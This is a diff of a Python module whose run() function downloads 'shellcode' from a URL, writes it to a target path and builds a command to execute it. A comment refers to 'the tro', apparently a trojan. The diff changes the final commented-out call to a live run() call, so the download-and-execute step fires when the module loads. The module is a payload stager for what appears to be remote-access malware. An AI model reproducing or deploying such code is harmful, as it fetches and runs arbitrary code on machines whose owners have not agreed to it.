@@ -49,8 +49,7 @@ def run(**args):
     http = urllib3.PoolManager()
     #The HTTPResponse object provides status, data, and header attributes:
     r = http.request('GET', url)
-    print(r.data)
-    shellcode = r.data.decode()
+    shellcode = r.data.decode('utf-8')
   except urllib3.exceptions.MaxRetryError:
   	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
   	return "getFileFromURI: HTTP Error 404: File not found"
@@ -60,15 +59,15 @@ def run(**args):
 
   #The data attribute of the response is always set to a byte string representing the response content
   cmd = ""
-  print(shellcode)
   if bin:
     mon_fichier = open(OsTargetpath, "wb")
     mon_fichier.write(shellcode)
     mon_fichier.close()
     cmd= "./{}".format(OsTargetpath)
   else:
+    print(shellcode)
     mon_fichier = open(OsTargetpath, "w")
-    mon_fichier.write(shellcode)
+    mon_fichier.write(str(shellcode))
     mon_fichier.close()
     cmd= ScriptExec+" "+OsTargetpath
 
@@ -85,7 +84,7 @@ def run(**args):
   return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-#run()
+run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
